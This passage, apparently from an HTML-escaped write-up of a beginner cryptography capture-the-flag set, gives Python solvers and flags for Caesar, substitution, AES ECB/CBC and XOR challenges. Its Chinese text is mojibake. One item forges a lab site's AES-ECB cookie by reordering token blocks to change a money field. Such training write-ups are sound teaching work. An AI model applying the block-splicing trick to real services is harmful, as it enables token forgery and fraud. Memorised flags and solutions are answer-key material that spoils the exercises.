FELCIZLHLENTLADCGUJNLMNIEZCTFOJSXZELFOUEZNJCGNDYGFA
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;# slove.py
from collections import Counter
import string
import hashlib

cipher_text = &amp;#39;TWENTYYEARSAGOLAWENFORCEMENTORGANIZATIONSLOBBIEDTOREQUIREDATAANDCOMMUNICATIONSERVICESTOENGINEERTHEIRPRODUCTSTOGUARANTEELAWENFORCEMENTACCESSTOALLDATAAFTERLENGTHYDEBATEANDVIGOROUSPREDICTIONSOFENFORCEMENTCHANNELSGOINGDARKTHESEATTEMPTSTOREGULATETHEEMERGINGINTERNETWEREABANDONEDINTHEINTERVENINGYEARSINNOVATIONONTHEINTERNETFLOURISHEDANDLAWENFORCEMENTAGENCIESFOUNDNEWANDMOREEFFECTIVEMEANSOFACCESSINGVASTLYLARGERQUANTITIESOFDATATODAYWEAREAGAINHEARINGCALLSFORREGULATIONTOMANpubDateTHEPROVISIONOFEXCEPTIONALACCESSMECHANISMSINTHISREPORTAGROUPOFCOMPUTERSCIENTISTSANDSECURITYEXPERTSMANYOFWHOMPARTICIPATEDINASTUDYOFTHESESAMETOPICSHASCONVENEDTOEXPLORETHELIKELYEFFECTSOFIMPOSINGEXTRAORDINARYACCESSMANpubDateSWEHAVEFOUNDTHATTHEDAMAGETHATCOULDBECAUSEDBYLAWENFORCEMENTEXCEPTIONALACCESSREQUIREMENTSWOULDBEEVENGREATERTODAYTHANITWOULDHAVEBEENYEARSAGOINTHEWAKEOFTHEGROWINGECONOMICANDSOCIALCOSTOFTHEFUNDAMENTALINSECURITYOFTODAYSINTERNETENVIRONMENTANYPROPOSALSTHATALTERTHESECURITYDYNAMICSONLINESHOULDBEAPPROACHEDWITHCAUTIONEXCEPTIONALACCESSWOULDFORCEINTERNETSYSTEMDEVELOPERSTOREVERSEFORWARDSECRECYDESIGNPRACTICESTHATSEEKTOMINIMIZETHEIMPACTONUSERPRIVACYWHENSYSTEMSAREBREACHEDTHECOMPLEXITYOFTODAYSINTERNETENVIRONMENTWITHMILLIONSOFAPPSANDGLOBALLYCONNECTEDSERVICESMEANSTHATNEWLAWENFORCEMENTREQUIREMENTSARELIKELYTOINTRODUCEUNANTICIPATEDHARDTODETECTSECURITYFLAWSBEYONDTHESEANDOTHERTECHNICALVULNERABILITIESTHEPROSPECTOFGLOBALLYDEPLOYEDEXCEPTIONALACCESSSYSTEMSRAISESDIFFICULTPROBLEMSABOUTHOWSUCHANENVIRONMENTWOULDBEGOVERNEDANDHOWTOENSURETHATSUCHSYSTEMSWOULDRESPECTHUMANRIGHTSANDTHERULEOFLAW&amp;#39;
def calculate_frequencies(text):
    text = text.upper()
    total = len(text)
    frequencies = {ch: text.count(ch) / total for ch in string.ascii_uppercase}
    return frequencies

#  https://en.wikipedia.org/wiki/Letter_frequency
english_frequencies = {
    &amp;#39;A&amp;#39;: 0.0817, &amp;#39;B&amp;#39;: 0.0150, &amp;#39;C&amp;#39;: 0.0278, &amp;#39;D&amp;#39;: 0.0425, &amp;#39;E&amp;#39;: 0.1270,
    &amp;#39;F&amp;#39;: 0.0223, &amp;#39;G&amp;#39;: 0.0202, &amp;#39;H&amp;#39;: 0.0609, &amp;#39;I&amp;#39;: 0.0697, &amp;#39;J&amp;#39;: 0.0015,
    &amp;#39;K&amp;#39;: 0.0077, &amp;#39;L&amp;#39;: 0.0403, &amp;#39;M&amp;#39;: 0.0241, &amp;#39;N&amp;#39;: 0.0675, &amp;#39;O&amp;#39;: 0.0751,
    &amp;#39;P&amp;#39;: 0.0193, &amp;#39;Q&amp;#39;: 0.0010, &amp;#39;R&amp;#39;: 0.0599, &amp;#39;S&amp;#39;: 0.0633, &amp;#39;T&amp;#39;: 0.0906,
    &amp;#39;U&amp;#39;: 0.0276, &amp;#39;V&amp;#39;: 0.0098, &amp;#39;W&amp;#39;: 0.0236, &amp;#39;X&amp;#39;: 0.0015, &amp;#39;Y&amp;#39;: 0.0197,
    &amp;#39;Z&amp;#39;: 0.0007
}

def caesar_decrypt(text, shift):
    decrypted_text = &amp;quot;&amp;quot;
    for char in text:
        if &amp;#39;A&amp;#39; &amp;lt;= char &amp;lt;= &amp;#39;Z&amp;#39;:
            decrypted_char = chr((ord(char) - ord(&amp;#39;A&amp;#39;) - shift) % 26 + ord(&amp;#39;A&amp;#39;))
        else:
            decrypted_char = char
        decrypted_text += decrypted_char
    return decrypted_text

cipher_frequencies = calculate_frequencies(cipher_text)

most_frequent_cipher_letter = max(cipher_frequencies, key=cipher_frequencies.get)
shift = (ord(most_frequent_cipher_letter) - ord(&amp;#39;E&amp;#39;)) % 26

decrypted_text = caesar_decrypt(cipher_text, shift)

print(f&amp;quot;Decrypted text with shift {shift}:&amp;quot;)
print(decrypted_text)
print(f&amp;#39;FLAG{{{hashlib.sha256(decrypted_text.encode()).hexdigest()}}}&amp;#39;)
&lt;/code&gt;&lt;/pre&gt;
&lt;hr&gt;
&lt;h3&gt;10 - Frequency Analysis On Caesar Cipher&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;cipher.txt Ë£°Èù¢ÊòØ‰∏ÄÊÆµË¢´Âá±Ëñ©Âä†ÂØÜÁöÑÊï∏ÊìöÔºàÂíåÂâçÈù¢Âá±Ëñ©Âä†ÂØÜÈ°åÁõÆ‰∏ÄÊ®£ÁöÑÊï∏ÊìöÔºâÔºåÈÄôÈ°åÁöÑÁõÆÊ®ôÊòØÁî® Python ÊääÈÄôÊÆµÊï∏ÊìöÁî®È†ªÁéáÂàÜÊûêÁöÑÊñπÊ≥ïËß£ÂØÜÔºåËß£ÂØÜÂæåÁöÑÊìç‰ΩúÂíå‰∏ä‰∏ÄÈ°å‰∏ÄÊ®£

//ciphet.txt
ZNKIGKYGXIOVNKXOYGXKGRREURJIOVNKXCNOINOYXKGRRECKGQOSTUZYAXKNUCURJHKIGAYKOSZUURGFEZURUUQGZZNKCOQOVGMKGZZNKSUSKTZHAZOLOMAXKOZYMUZZUHKGZRKGYZROQKLOLZEEKGXYURJUXCNGZKBKXBGPJADLIVBAYKZNUYKRGYZZKTINGXGIZKXYGYZNKYURAZOUT
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;# slove.py
from collections import Counter
import string
import hashlib

cipher_text = &amp;#39;ZNKIGKYGXIOVNKXOYGXKGRREURJIOVNKXCNOINOYXKGRRECKGQOSTUZYAXKNUCURJHKIGAYKOSZUURGFEZURUUQGZZNKCOQOVGMKGZZNKSUSKTZHAZOLOMAXKOZYMUZZUHKGZRKGYZROQKLOLZEEKGXYURJUXCNGZKBKXBGPJADLIVBAYKZNUYKRGYZZKTINGXGIZKXYGYZNKYURAZOUT&amp;#39;
def calculate_frequencies(text):
    text = text.upper()
    total = len(text)
    frequencies = {ch: text.count(ch) / total for ch in string.ascii_uppercase}
    return frequencies

#  https://en.wikipedia.org/wiki/Letter_frequency
english_frequencies = {
    &amp;#39;A&amp;#39;: 0.0817, &amp;#39;B&amp;#39;: 0.0150, &amp;#39;C&amp;#39;: 0.0278, &amp;#39;D&amp;#39;: 0.0425, &amp;#39;E&amp;#39;: 0.1270,
    &amp;#39;F&amp;#39;: 0.0223, &amp;#39;G&amp;#39;: 0.0202, &amp;#39;H&amp;#39;: 0.0609, &amp;#39;I&amp;#39;: 0.0697, &amp;#39;J&amp;#39;: 0.0015,
    &amp;#39;K&amp;#39;: 0.0077, &amp;#39;L&amp;#39;: 0.0403, &amp;#39;M&amp;#39;: 0.0241, &amp;#39;N&amp;#39;: 0.0675, &amp;#39;O&amp;#39;: 0.0751,
    &amp;#39;P&amp;#39;: 0.0193, &amp;#39;Q&amp;#39;: 0.0010, &amp;#39;R&amp;#39;: 0.0599, &amp;#39;S&amp;#39;: 0.0633, &amp;#39;T&amp;#39;: 0.0906,
    &amp;#39;U&amp;#39;: 0.0276, &amp;#39;V&amp;#39;: 0.0098, &amp;#39;W&amp;#39;: 0.0236, &amp;#39;X&amp;#39;: 0.0015, &amp;#39;Y&amp;#39;: 0.0197,
    &amp;#39;Z&amp;#39;: 0.0007
}

def caesar_decrypt(text, shift):
    decrypted_text = &amp;quot;&amp;quot;
    for char in text:
        if &amp;#39;A&amp;#39; &amp;lt;= char &amp;lt;= &amp;#39;Z&amp;#39;:
            decrypted_char = chr((ord(char) - ord(&amp;#39;A&amp;#39;) - shift) % 26 + ord(&amp;#39;A&amp;#39;))
        else:
            decrypted_char = char
        decrypted_text += decrypted_char
    return decrypted_text

cipher_frequencies = calculate_frequencies(cipher_text)

most_frequent_cipher_letter = max(cipher_frequencies, key=cipher_frequencies.get)
shift = (ord(most_frequent_cipher_letter) - ord(&amp;#39;E&amp;#39;)) % 26

decrypted_text = caesar_decrypt(cipher_text, shift)

print(f&amp;quot;Decrypted text with shift {shift}:&amp;quot;)
print(decrypted_text)
print(f&amp;#39;FLAG{{{hashlib.sha256(decrypted_text.encode()).hexdigest()}}}&amp;#39;)
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;FLAG{e241bb8575436ca05489e433b3f0782bf30c5ec286459cccd3a0830e718b6ded}&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h3&gt;11 - Affine Cipher&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;cipher.txt Ë£°Èù¢ÊòØ‰∏ÄÊÆµË¢´‰ªøÂ∞ÑÂØÜÁ¢ºÂä†ÂØÜÂæåÁöÑÊï∏ÊìöÔºåÊääÈÄôÊÆµÊï∏ÊìöÁî® Python Ëß£ÂØÜÂæåÔºà‰∏çÈúÄË¶ÅÂàÜÊûêÈÄôÊÆµÊï∏ÊìöËß£ÂØÜÂæåÂú®Ë¨õ‰ªÄÈ∫ºÔºåÁêÜË´ñ‰∏äËß£ÂØÜÂæåÊúÉÊãøÂà∞‰∏ÄÊÆµÊòØÂÖ®Â§ßÂØ´ÁöÑÊï∏ÊìöÔºâÁõ¥Êé•‰∏üÂà∞ Crypto Playground ÁöÑ Get Flag Ë£°Êãø flag

Ê≥®ÊÑè‰ªøÂ∞ÑÂØÜÁ¢ºÁöÑ charset ÊòØ ABCDEFGHIJKLMNOPQRSTUVWXYZ ,.

//cipher.txt
BOHHIKBI,OZ,REI,WZRIKZIR,EX.,BOHI,RO,KISU,XSHO.R,ICBSG.WYISU,OZ, WZXZBWXS,WZ.RWRGRWOZ.,.IKYWZP,X.RKG.RIT,REWKT,DXKRWI.,RO,DKOBI..,ISIBRKOZWB,DXUHIZR.F,NEWSI,REI,.U.RIH,NOKA.,NISS,IZOGPE, OKHO.R,RKXZ.XBRWOZ.Q,WR,.RWSS,.G  IK., KOH,REI,WZEIKIZR,NIXAZI..I.,O ,REI,RKG.R,MX.IT,HOTISF,BOHDSIRISU,ZOZKIYIK.WMSI,RKXZ.XBRWOZ.,XKI,ZOR,KIXSSU,DO..WMSIQ,.WZBI, WZXZBWXS,WZ.RWRGRWOZ.,BXZZORXYOWT,HITWXRWZP,TW.DGRI.F,REI,BO.R,O ,HITWXRWOZ,WZBKIX.I.,RKXZ.XBRWOZ,BO.R.Q,SWHWRWZP,REIHWZWHGH,DKXBRWBXS,RKXZ.XBRWOZ,.WJI,XZT,BGRRWZP,O  ,REI,DO..WMWSWRU, OK,.HXSS,BX.GXS,RKXZ.XBRWOZ.QXZT,REIKI,W.,X,MKOXTIK,BO.R,WZ,REI,SO..,O ,XMWSWRU,RO,HXAI,ZOZKIYIK.WMSI,DXUHIZR., OK,ZOZKIYIK.WMSI.IKYWBI.F,NWRE,REI,DO..WMWSWRU,O ,KIYIK.XSQ,REI,ZIIT, OK,RKG.R,.DKIXT.F,HIKBEXZR.,HG.RMI,NXKU,O ,REIWK,BG.ROHIK.Q,EX..SWZP,REIH, OK,HOKI,WZ OKHXRWOZ,REXZ,REIU,NOGST,OREIKNW.I,ZIITF,X,BIKRXWZ,DIKBIZRXPI,O , KXGT,W.,XBBIDRIT,X.,GZXYOWTXMSIF,REI.I,BO.R.,XZT,DXUHIZR,GZBIKRXWZRWI.BXZ,MI,XYOWTIT,WZ,DIK.OZ,MU,G.WZP,DEU.WBXS,BGKKIZBUQ,MGR,ZO,HIBEXZW.H,ICW.R.,RO,HXAI,DXUHIZR.OYIK,X,BOHHGZWBXRWOZ.,BEXZZIS,NWREOGR,X,RKG.RIT,DXKRUF
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÂÖàÁî® &lt;a href=&quot;https://www.guballa.de/substitution-solver&quot;&gt;https://www.guballa.de/substitution-solver&lt;/a&gt;
&lt;del&gt;ÊàëÊòØ‰∫∫Â∑•Âà™Èô§Ê®ôÈªûÁ¨¶Ëôü&lt;/del&gt;
Ë¶ÅÊääÊ®ôÈªûÁ¨¶ËôüËÄÉÈáèÂú®ÂÖß&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;# slove.py
import hashlib
ans = &amp;#39;COMMERCE ON THE INTERNET HAS COME TO RELY ALMOST EXCLUSIVELY ON FINANCIAL INSTITUTIONS SERVING ASTRUSTED THIRD PARTIES TO PROCESS ELECTRONIC PAYMENTS. WHILE THE SYSTEM WORKS WELL ENOUGH FORMOST TRANSACTIONS, IT STILL SUFFERS FROM THE INHERENT WEAKNESSES OF THE TRUST BASED MODEL. COMPLETELY NONREVERSIBLE TRANSACTIONS ARE NOT REALLY POSSIBLE, SINCE FINANCIAL INSTITUTIONS CANNOTAVOID MEDIATING DISPUTES. THE COST OF MEDIATION INCREASES TRANSACTION COSTS, LIMITING THEMINIMUM PRACTICAL TRANSACTION SIZE AND CUTTING OFF THE POSSIBILITY FOR SMALL CASUAL TRANSACTIONS,AND THERE IS A BROADER COST IN THE LOSS OF ABILITY TO MAKE NONREVERSIBLE PAYMENTS FOR NONREVERSIBLESERVICES. WITH THE POSSIBILITY OF REVERSAL, THE NEED FOR TRUST SPREADS. MERCHANTS MUSTBE WARY OF THEIR CUSTOMERS, HASSLING THEM FOR MORE INFORMATION THAN THEY WOULD OTHERWISE NEED. A CERTAIN PERCENTAGE OF FRAUD IS ACCEPTED AS UNAVOIDABLE. THESE COSTS AND PAYMENT UNCERTAINTIESCAN BE AVOIDED IN PERSON BY USING PHYSICAL CURRENCY, BUT NO MECHANISM EXISTS TO MAKE PAYMENTSOVER A COMMUNICATIONS CHANNEL WITHOUT A TRUSTED PARTY.&amp;#39;
print(f&amp;#39;FLAG{{{hashlib.sha256(ans.encode()).hexdigest()}}}&amp;#39;)
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;FLAG{510fc8a1bf88260c1a1f24491927d5419fadafafc3764aaba07900cf9f4b397a}&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;2 - Symmetric Cipher&lt;/h2&gt;
&lt;hr&gt;
&lt;h3&gt;1 - Crypto Playground - AES&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;cipher ÊòØ‰∏ÄÊÆµË¢´ AES Âä†ÂØÜÂæåÁöÑÂØÜÊñáÔºåÂä†ÂØÜÁöÑÈáëÈë∞ÊòØ keyÔºåËß£ÂØÜ cipher ‰∏¶ÂòóË©¶‰∏çÂêåÁöÑ key„ÄÅcipher Â∞çËß£ÂØÜÊúâ‰ªÄÈ∫ºÂΩ±ÈüøÔºàÂêåÊ®£‰πüÂèØ‰ª•Ë©¶Ë©¶Áúã‰∏çÂêåÁöÑ key Âíå plain Â∞çÂä†ÂØÜÊúâ‰ªÄÈ∫ºÂΩ±ÈüøÔºâ

cipher : beb500cb0298d5a427d3c6532fa0d88e
key : e4cb2aa8ff51a7209a923d59932b5841
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;# slove.py
from Crypto.Cipher import AES
from binascii import *

key = unhexlify(&amp;quot;e4cb2aa8ff51a7209a923d59932b5841&amp;quot;)
cipher = unhexlify(&amp;quot;beb500cb0298d5a427d3c6532fa0d88e&amp;quot;)
# ‰∏ÄÂÆöË¶Å16NÔºåËÄå‰∏îË¶ÅÂ∞çÈΩä

cipher_aes = AES.new(key, AES.MODE_ECB)
ans = cipher_aes.decrypt(cipher).decode(&amp;quot;utf-8&amp;quot;)
print(ans)
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;FLAG{A--E--S}&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h3&gt;2 - AES&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;cipher ÊòØ‰∏ÄÊÆµË¢´ AES Âä†ÂØÜÂæåÁöÑÂØÜÊñáÔºåÂä†ÂØÜÁöÑÈáëÈë∞ÊòØ keyÔºåÁî® Python ‰æÜËß£ÂØÜ cipher

cipher : 75924759583675f4a56c2c322c72be86
key : 77e9ed71d1d4ea27816aa0538c091f14
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;# slove.py
from Crypto.Cipher import AES
from binascii import *

key = unhexlify(&amp;quot;77e9ed71d1d4ea27816aa0538c091f14&amp;quot;)
cipher = unhexlify(&amp;quot;75924759583675f4a56c2c322c72be86&amp;quot;)
# ‰∏ÄÂÆöË¶Å16NÔºåËÄå‰∏îË¶ÅÂ∞çÈΩä

cipher_aes = AES.new(key, AES.MODE_ECB)
ans = cipher_aes.decrypt(cipher).decode(&amp;quot;utf-8&amp;quot;)
print(ans)
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;FLAG{PyCrypt...}&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h3&gt;3 - Crypto Playground - AES ECB Mode&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;cipher ÊòØ‰∏ÄÊÆµË¢´ AES ECB Mode Âä†ÂØÜÂæåÁöÑÂØÜÊñáÔºåÂä†ÂØÜÁöÑÈáëÈë∞ÊòØ keyÔºåÂòóË©¶Êää cipher Ëß£ÂØÜ

cipher : 8d8f543098319a54c0c44c265a50bc2f3ff33f67cc44c6c4f992bdc0b0adcbc86aece1f2f0b59772a59c5060d9669d0b
key : 872b456c9b4e3b320555e62b6ad9ee32
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;# slove.py
from Crypto.Cipher import AES
from binascii import *

key = unhexlify(&amp;quot;872b456c9b4e3b320555e62b6ad9ee32&amp;quot;)
cipher1 = unhexlify(&amp;quot;8d8f543098319a54c0c44c265a50bc2f&amp;quot;)
cipher2 = unhexlify(&amp;quot;3ff33f67cc44c6c4f992bdc0b0adcbc8&amp;quot;)
cipher3 = unhexlify(&amp;quot;6aece1f2f0b59772a59c5060d9669d0b&amp;quot;)
# ‰∏ÄÂÆöË¶Å16NÔºåËÄå‰∏îË¶ÅÂ∞çÈΩä

ans=&amp;#39;&amp;#39;
cipher_aes = AES.new(key, AES.MODE_ECB)
ans += cipher_aes.decrypt(cipher1).decode(&amp;quot;utf-8&amp;quot;)
ans += cipher_aes.decrypt(cipher2).decode(&amp;quot;utf-8&amp;quot;)
ans += cipher_aes.decrypt(cipher3).decode(&amp;quot;utf-8&amp;quot;)
print(ans)
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;FLAG{Plain&amp;#39;s_length_needs_to_be_multiple_of_16}&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h3&gt;4 - AES ECB Mode&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;cipher ÊòØ‰∏ÄÊÆµË¢´ AES ECB Mode Âä†ÂØÜÂæåÁöÑÂØÜÊñáÔºåÂä†ÂØÜÁöÑÈáëÈë∞ÊòØ keyÔºåÁî® Python Êää cipher Ëß£ÂØÜ

cipher : 6b2f26db534ee26ab1c987cea73a2fecd1a3f8335c50412ffa785d3ce5b90ad310a064dfa4bf824bc7968d876c9e5d6917e1157fc27a29c2e042a82f08ed6c96
key : 85f1c9f80a5b9e440380cf9b02b31ff46de4f864cd7c2ba32f7ec2881b07d71c
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;# slove.py
from Crypto.Cipher import AES
from binascii import *

key = unhexlify(&amp;quot;85f1c9f80a5b9e440380cf9b02b31ff46de4f864cd7c2ba32f7ec2881b07d71c&amp;quot;)
cipher1 = unhexlify(&amp;quot;6b2f26db534ee26ab1c987cea73a2fecd1a3f8335c50412ffa785d3ce5b90ad3&amp;quot;)
cipher2 = unhexlify(&amp;quot;10a064dfa4bf824bc7968d876c9e5d6917e1157fc27a29c2e042a82f08ed6c96&amp;quot;)
# ‰∏ÄÂÆöË¶Å16NÔºåËÄå‰∏îË¶ÅÂ∞çÈΩä

ans=&amp;#39;&amp;#39;
cipher_aes = AES.new(key, AES.MODE_ECB)
ans += cipher_aes.decrypt(cipher1).decode(&amp;quot;utf-8&amp;quot;)
ans += cipher_aes.decrypt(cipher2).decode(&amp;quot;utf-8&amp;quot;)
print(ans)
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;FLAG{Check_plain&amp;#39;s_length_before_AES_ECB_Encrypt~}&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h3&gt;5 - Cut &amp;amp; Paste - 0&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;ÁêÜËß£ Cut &amp;amp; Paste ÂæåÁ´ØÁöÑÊâÄÊúâÈÇèËºØ
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/Sk8G537FC.png&quot; alt=&quot;image&quot;&gt;
‰∏ÄÂÄãË≤∑ÊóóÂ≠êÁöÑÁ∂≤È†Å
Ë¶ÅËßÄÂØü‰ªñÁöÑcookie token
&lt;img src=&quot;https://hackmd.io/_uploads/rkBI9n7tA.png&quot; alt=&quot;image&quot;&gt;
ËßÄÂØüÁîöÈ∫ºË¢´Âä†ÂØÜ‰∫Ü&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;FLAG{Now_you_know_Flask!!!}&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h3&gt;6 - Cut &amp;amp; Paste - 1&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;ÂòóË©¶Êõ¥Êîπ money ‰æÜÊãøÂà∞ flag
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Âà©Áî®tokenÊãºÊé•ÁöÑÊñπÂºèÂéªÂ∞á100ÂÖÉÊõøÊèõÊéâ&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;username=aaaaaaa
1234567891234567
cccccc&amp;amp;money=100
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Áî®ÈÄôÊ®£ÁöÑÁµêÊßãÂéªÁúã‰ª•ÂèäÂ∞çÊØîtoken
&lt;img src=&quot;https://hackmd.io/_uploads/HJLHs27tC.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;token =
26c90abbbe466b6536a86d0153096a3e  &amp;gt;username=aaaaaaa
f27e4b014aaa9dd6620ab19c810729c6  &amp;gt;1234567891234567
4ffeda74080d40ea1384c26ee231aab5  &amp;gt;cccccc&amp;amp;money=100
146af8b1750e6b69fcb3fc0d5e9a938a  &amp;gt;Á©∫ÂÄºÔºåAESÁöÑÁâπÊÄß
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÊàëÂÄëÂè™Ë¶ÅËΩâÊàê&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;token =
26c90abbbe466b6536a86d0153096a3e  &amp;gt;username=aaaaaaa
4ffeda74080d40ea1384c26ee231aab5  &amp;gt;cccccc&amp;amp;money=100
f27e4b014aaa9dd6620ab19c810729c6  &amp;gt;1234567891234567
146af8b1750e6b69fcb3fc0d5e9a938a  &amp;gt;Á©∫ÂÄºÔºåAESÁöÑÁâπÊÄß
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÈÄôÊ®£ÈáëÈ°çÂ∞±Ë¢´ÈÅûË£úÁöÑÊï∏Â≠óÈäúÊé•‰∏ä‰∫Ü&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ÂÆåÊï¥token =
26c90abbbe466b6536a86d0153096a3e4ffeda74080d40ea1384c26ee231aab5f27e4b014aaa9dd6620ab19c810729c6146af8b1750e6b69fcb3fc0d5e9a938a
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/r16E32mFA.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;FLAG{why_do_you_have_so_much_money???}&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h3&gt;7 - Crypto Playground - XOR&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;Â∑≤Áü•

A ‚äï FLAG = a3eb43a265fb02a62f6db2e7bf749b6aab4350fb004031c920d1
FLAG ‚äï B = e322463f629716f9c07bd310a1ffcd84c5bcf2baf736b7b749b8
A ‚äï B ‚äï FLAG = 068544da7c287b00967914a875e53999319fe507df44af1e5614
Ê±Ç FLAG
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Áî®XORÁöÑÁâπÊÄß
(A ‚äï FLAG) ‚äï (FLAG ‚äï B) = (A ‚äï B)
Êé•Ëëó
(A ‚äï B) ‚äï (A ‚äï B ‚äï FLAG) = FLAG&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;# slove.py
from pwn import *
from binascii import *

A_XOR_FLAG = unhexlify(&amp;quot;a3eb43a265fb02a62f6db2e7bf749b6aab4350fb004031c920d1&amp;quot;)
FLAG_XOR_B = unhexlify(&amp;quot;e322463f629716f9c07bd310a1ffcd84c5bcf2baf736b7b749b8&amp;quot;)
A_XOR_B_XOR_FLAG = unhexlify(&amp;quot;068544da7c287b00967914a875e53999319fe507df44af1e5614&amp;quot;)

A_XOR_B = xor(A_XOR_FLAG, FLAG_XOR_B)
FLAG = xor(A_XOR_B, A_XOR_B_XOR_FLAG)
FLAG = FLAG.decode(&amp;#39;ascii&amp;#39;)
print(FLAG)
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;FLAG{Do&lt;em&gt;you_know&lt;/em&gt;&lt;code&gt;GF(2)&lt;/code&gt;?}&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h3&gt;8 - Crypto Playground - AES CBC Mode&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;cipher ÊòØ‰∏ÄÊÆµË¢´ AES CBC Mode Âä†ÂØÜÂæåÁöÑÂØÜÊñáÔºåÂä†ÂØÜÁöÑÈáëÈë∞ÊòØ keyÔºåÂòóË©¶Êää cipher Ëß£ÂØÜ

cipher : 829ad9df660fd928274eb552bc6bc88dd00a62c48d221f37b427a0db7b6d9e5dbcf0f8a52d156fa0fa881dc46eb5555b
key : 62bdc4885ca8a8be1d1e8826a2187528
iv : 7ae66a4b7e87a6d374ce66e73a112bf0
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;# slove.py
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import binascii

def hex_to_ascii(hex_string):
    byte_data = bytes.fromhex(hex_string)
    ascii_string = byte_data.decode(&amp;#39;ascii&amp;#39;)
    return ascii_string

cipher_hex = &amp;#39;829ad9df660fd928274eb552bc6bc88dd00a62c48d221f37b427a0db7b6d9e5dbcf0f8a52d156fa0fa881dc46eb5555b&amp;#39;
key_hex = &amp;#39;62bdc4885ca8a8be1d1e8826a2187528&amp;#39;
iv_hex = &amp;#39;7ae66a4b7e87a6d374ce66e73a112bf0&amp;#39;

cipher = binascii.unhexlify(cipher_hex)
key = binascii.unhexlify(key_hex)
iv = binascii.unhexlify(iv_hex)

cipher_obj = AES.new(key, AES.MODE_CBC, iv)

try:
    decrypted_padded = cipher_obj.decrypt(cipher)
    ans = binascii.hexlify(decrypted_padded).decode(&amp;#39;utf-8&amp;#39;)
    ans = hex_to_ascii(ans)
    print(ans)
except ValueError as e:
    print(&amp;quot;Error:&amp;quot;, e)
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;FLAG{AES_CBC_Mode_needs_padding_too!}&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h3&gt;9 - AES CBC Mode&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;cipher ÊòØ‰∏ÄÊÆµË¢´ AES CBC Mode Âä†ÂØÜÂæåÁöÑÂØÜÊñáÔºåÂä†ÂØÜÁöÑÈáëÈë∞ÊòØ keyÔºåÂòóË©¶Áî® Python Êää cipher Ëß£ÂØÜ

cipher : af6ab08a9380c038328bec3c47e70b915bbf4faf0e4b72db5f56d274bd6be5458552b6023e64f10a492bb88e839e51516b50903363bc637a1fe2550317392564
key : d1e138810051ac8deaef9fd33c969e080003d3f87d264dd431190f0e7795528b
iv : 25741419227aece3cb4f715f1c2b3878
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;# slove.py
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import binascii

def hex_to_ascii(hex_string):
    byte_data = bytes.fromhex(hex_string)
    ascii_string = byte_data.decode(&amp;#39;ascii&amp;#39;)
    return ascii_string

cipher_hex = &amp;#39;af6ab08a9380c038328bec3c47e70b915bbf4faf0e4b72db5f56d274bd6be5458552b6023e64f10a492bb88e839e51516b50903363bc637a1fe2550317392564&amp;#39;
